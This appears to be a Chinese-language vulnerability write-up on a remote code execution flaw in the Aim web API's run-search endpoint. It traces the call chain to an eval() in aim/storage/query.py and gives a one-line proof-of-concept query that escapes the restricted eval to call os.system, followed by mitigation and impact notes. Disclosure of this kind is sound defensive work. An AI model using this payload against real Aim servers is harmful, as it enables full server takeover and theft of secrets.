#  Aim Web API 远程代码执行   
原创 Jacky  jacky安全   2024-03-07 20:28  
  
## 摘要  
- 漏洞类型：远程代码执行（RCE）  
- 产品：目标  
- 版本：>= 3.0.0（afaik）  
- 受影响的端点：  
 /api/runs/search/run/  
- 严重性：临界  
## 描述  
  
在aim  
项目中发现了一个关键的远程代码执行漏洞，特别是在/api/runs/search/run/  
端点中。该漏洞允许攻击者在服务器上执行任意代码，这可能会导致系统完全泄露。  
### 易受弱的代码  
  
该漏洞存在于theaimaim/web/api/runs/views.py  
文件中的therunrun_search_api  
函数中。该代码没有正确限制用户对RunView  
对象的访问，允许通过query  
参数执行任意代码。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZR1w6JVBWdjfRIL6LjdN4nG6fH7WyIw8K2SrZ1TYicvzVeeYGZNWMQTyoBOzJOP9f0FAE60LLLk2RoNJeE3uVA/640?wx_fmt=jpeg "")  
​  
  
开始分析🧐  
```
@runs_router.get('/search/run/', response_model=RunSearchApiOut, responses={400: {'model': QuerySyntaxErrorOut}})
async def run_search_api(q: Optional[str] = '', limit: Optional[int] = 0, offset: Optional[str] = None, ...):
    from aim.sdk.sequence_collection import QueryRunSequenceCollection    repo = get_project_repo()    query = checked_query(q)    repo._prepare_runs_cache()    runs = QueryRunSequenceCollection(repo=repo, query=query, paginated=bool(limit), offset=offset, ...)    streamer = run_search_resul
t_stre
amer(runs, limit, ...)
    return StreamingResponse(streamer)

```  
### 功能呼叫链  
1. 端点处理程序：  
  
1.     - 端点：/api/runs/search/run/  
    - 位置：aim/web/api/runs/views.py  
    - 线路：#80  
    -   
    - 代码：```
streamer
 = run_search_result_streamer(runs, limit, ...)

```  
  
  
1. 端点：/api/runs/search/run/  
1. 位置：aim/web/api/runs/views.py  
1. 线路：#80  
1.   
1. 代码：```
streamer
 = run_search_result_streamer(runs, limit, ...)

```  
  
1. 迭代超过运行：  
  
1.     - 位置：aim/web/api/runs/utils.py  
    -   
    - 线路：#258  
    -   
    - 功能：run_search_result_streamer  
    - 代码：```
for 
run_trace_collection, progress in runs.iter_runs():   # ...
```  
  
  
1. 位置：aim/web/api/runs/utils.py  
1.   
1. 线路：#258  
1.   
1. 功能：run_search_result_streamer  
1. 代码：```
for 
run_trace_collection, progress in runs.iter_runs():   # ...
```  
  
1. QueryRunSequenceCollection.iter_  
runs（）  
：  
  
1. ​  
    - 位置：aim/sdk/sequence_collection.py  
    -   
    - 线路：#249  
    -   
    - 方法：  
    -   
    - iter_runs  
    - 代码：```
self.query.check(run=run_view)

```  
  
  
1. 位置：aim/sdk/sequence_collection.py  
1.   
1. 线路：#249  
1.   
1. 方法：  
1.   
1. iter_runs  
1. 代码：```
self.query.check(run=run_view)

```  
  
1. **Query.check（）：**  
1. ****  
1. 位置：aim/storage/query.py  
1.   
1. 线路：#190  
1.   
1. 方法：check  
1.   
1. 代码：```
eval(self._checker, restricted_globals, namespace)
```  
  
### 概念验证（PoC）  
  
以下POC演示了RCE漏洞：  
```
run.run.dataframe().query
("@run.run.__class__.__init__.__globals__['logging'].os.system('id')")

```  
  
利用对RunView对象的无限制访问，允许任意代码执行，导致服务器完全泄露，包括网络访问、文件系统、秘密和云元数据。  
### 减轻  
  
为了缓解此漏洞，建议：  
- **限制用户访问：**限制用户访问DataFrame等危险对象。  
  
- **实施适当的输入验证：**确保用户输入，特别是查询中使用的输入，经过适当验证和消毒，以防止代码注入。  
  
# 影响  
  
这种RCE漏洞可能会产生严重的后果，包括但不限于：  
- **网络泄露：**攻击者可以执行任意命令，这可能会导致网络泄露。  
  
- **文件系统访问：**对文件系统的完全访问允许攻击者读取、写入和删除文件，从而损害系统完整性和可用性。  
  
- **访问秘密：**访问文件系统内的敏感数据，包括环境变量、秘密和潜在的云元数据。  
  
- **数据泄露：**执行任意代码的能力为攻击者提供了泄露敏感信息的手段。  
  
